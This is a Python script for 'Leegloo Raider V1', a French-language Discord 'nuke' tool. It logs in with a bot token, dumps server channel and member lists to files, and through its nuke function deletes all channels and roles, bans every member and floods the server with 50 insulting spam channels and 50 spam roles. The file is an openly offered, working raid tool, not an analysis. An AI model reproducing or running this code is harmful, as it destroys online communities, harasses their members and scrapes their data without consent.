import discord
import asyncio
import getpass
from colorama import init, Fore, Style

# Initialisation de colorama
init(autoreset=True)

LOGO = f"""
{Fore.CYAN}
██╗     ███████╗███████╗ ██████╗  ██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██║     ██╔════╝██╔════╝██╔═══██╗██╔═══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
██║     █████╗  █████╗  ██║   ██║██║   ██║██║     ██║   ██║███████║██████╔╝
██║     ██╔══╝  ██╔══╝  ██║   ██║██║   ██║██║     ██║   ██║██╔══██║██╔══██╗
███████╗███████╗███████╗╚██████╔╝╚██████╔╝███████╗╚██████╔╝██║  ██║██║  ██║
╚══════╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝

           {Fore.MAGENTA}Leegloo Raider V1 - Bot Discord Nuke Tool{Style.RESET_ALL}
"""

intents = discord.Intents.default()
intents.members = True
client = discord.Client(intents=intents)


async def user_prompt():
    print(LOGO)
    print(Fore.GREEN + "Bienvenue dans le bot Discord Leegloo Raider V1.")
    token = getpass.getpass(Fore.YELLOW + "Entre ton token Discord (saisie cachée) : " + Style.RESET_ALL)

    try:
        await client.login(token)
    except Exception as e:
        print(Fore.RED + f"Erreur de connexion : {e}")
        return

    print(Fore.GREEN + f"Connexion réussie !\nLogged in as {client.user} (ID: {client.user.id})" + Style.RESET_ALL)

    # Lance le client dans un task à part
    asyncio.create_task(client.connect())

    await asyncio.sleep(1)  # petit délai pour lier le client

    while True:
        print()
        print(Fore.CYAN + "Options:")
        print(Fore.YELLOW + "[1]" + Fore.WHITE + " Bot stats")
        print(Fore.YELLOW + "[2]" + Fore.WHITE + " Channel dump (save channels info)")
        print(Fore.YELLOW + "[3]" + Fore.WHITE + " User dump (save members info)")
        print(Fore.YELLOW + "[4]" + Fore.RED + " Nuke server (danger!)")
        print(Fore.YELLOW + "[exit]" + Fore.WHITE + " Quitter le bot")
        command = input(Fore.GREEN + ">> " + Style.RESET_ALL).strip()

        if command == "1":
            botstat()
        elif command == "2":
            channeldump()
        elif command == "3":
            userdump()
        elif command == "4":
            await nuke()
        elif command.lower() == "exit":
            print(Fore.MAGENTA + "Au revoir !")
            await client.close()
            break
        else:
            print(Fore.RED + "Commande invalide, réessaie.")


def botstat():
    print(Fore.BLUE + "Statistiques des serveurs où est connecté le bot :")
    for guild in client.guilds:
        print(f"{Fore.CYAN} - {guild.name} (ID: {guild.id}) - Membres: {guild.member_count}")


def channeldump():
    id0 = input(Fore.YELLOW + "Server ID: " + Style.RESET_ALL)
    try:
        id0 = int(id0)
    except:
        print(Fore.RED + "ID invalide.")
        return

    for guild in client.guilds:
        if guild.id == id0:
            file = f"{guild.name}_{guild.id}_dumped_channels.txt"
            with open(file, "w", encoding="utf-8") as f:
                for c in guild.channels:
                    try:
                        line = f"Name: {c.name} - ID: {c.id}\n"
                        print(Fore.CYAN + line.strip())
                        f.write(line)
                    except Exception:
                        pass
            print(Fore.GREEN + f"Informations des channels sauvegardées dans {file}")
            return
    print(Fore.RED + f"Guilde avec l'ID {id0} introuvable ou bot pas membre.")


def userdump():
    id0 = input(Fore.YELLOW + "Server ID: " + Style.RESET_ALL)
    try:
        id0 = int(id0)
    except:
        print(Fore.RED + "ID invalide.")
        return

    for guild in client.guilds:
        if guild.id == id0:
            file = f"{guild.name}_{guild.id}_dumped_users.txt"
            with open(file, "w", encoding="utf-8") as f:
                for member in guild.members:
                    try:
                        line = f"Name: {member.name}#{member.discriminator} ID: {member.id}\n"
                        print(Fore.CYAN + line.strip())
                        f.write(line)
                    except Exception:
                        pass
            print(Fore.GREEN + f"Informations des membres sauvegardées dans {file}")
            return
    print(Fore.RED + f"Guilde avec l'ID {id0} introuvable ou bot pas membre.")


async def nuke():
    id0 = input(Fore.YELLOW + "Server ID: " + Style.RESET_ALL)
    try:
        id0 = int(id0)
    except:
        print(Fore.RED + "ID invalide.")
        return

    guild = None
    for g in client.guilds:
        if g.id == id0:
            guild = g
            break

    if guild is None:
        print(Fore.RED + f"Guilde avec l'ID {id0} introuvable ou bot pas membre.")
        return

    print(Fore.RED + f"!!! ATTENTION !!! Tu vas nuker le serveur {guild.name} (ID: {guild.id})")
    confirm = input(Fore.YELLOW + "Es-tu sûr ? (oui/non) : ").lower()
    if confirm != "oui":
        print(Fore.GREEN + "Opération annulée.")
        return

    # Supprimer les channels
    deleted_channels = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted_channels += 1
            print(Fore.RED + f"Channels supprimés: {deleted_channels}")
        except Exception as e:
            print(Fore.RED + f"Erreur suppression channel: {e}")
    print(Fore.GREEN + f"Suppression des channels terminée. Total: {deleted_channels}")

    # Supprimer les rôles (sauf @everyone)
    deleted_roles = 0
    roles = await guild.fetch_roles()
    for role in roles:
        if role.is_default():
            continue
        try:
            await role.delete()
            deleted_roles += 1
            print(Fore.RED + f"Rôles supprimés: {deleted_roles}")
        except Exception as e:
            print(Fore.RED + f"Erreur suppression rôle: {e}")
    print(Fore.GREEN + f"Suppression des rôles terminée. Total: {deleted_roles}")

    # Bannir les membres (attention, ça peut prendre du temps)
    banned_count = 0
    for member in guild.members:
        if member == client.user:
            continue
        try:
            await member.ban(reason="Nuked by Leegloo Raider V1")
            banned_count += 1
            print(Fore.RED + f"Membres bannis: {banned_count}")
        except Exception as e:
            print(Fore.RED + f"Erreur ban membre: {e}")
    print(Fore.GREEN + f"Bannissement terminé. Total: {banned_count}")

    # Créer des channels spam
    created_channels = 0
    for i in range(50):
        try:
            await guild.create_text_channel("TU TES FAIT RAID SALOPE<")
            created_channels += 1
            print(Fore.RED + f"Channels créés: {created_channels}")
        except Exception as e:
            print(Fore.RED + f"Erreur création channel: {e}")
    print(Fore.GREEN + f"Création de channels terminée. Total: {created_channels}")

    # Créer des rôles spam
    created_roles = 0
    for i in range(50):
        try:
            await guild.create_role(name="FORCE A TOI BG")
            created_roles += 1
            print(Fore.RED + f"Rôles créés: {created_roles}")
        except Exception as e:
            print(Fore.RED + f"Erreur création rôle: {e}")
    print(Fore.GREEN + f"Création de rôles terminée. Total: {created_roles}")

    print(Fore.MAGENTA + "Nuke terminé !")


@client.event
async def on_ready():
    # Juste print la liste des guilds pour debug
    print(LOGO)
    print(Fore.GREEN + f"Logged in as {client.user} (ID: {client.user.id})")
    print(Fore.CYAN + "Serveurs où le bot est connecté :")
    for guild in client.guilds:
        print(Fore.YELLOW + f" - {guild.name} (ID: {guild.id})")


if __name__ == "__main__":
    asyncio.run(user_prompt())
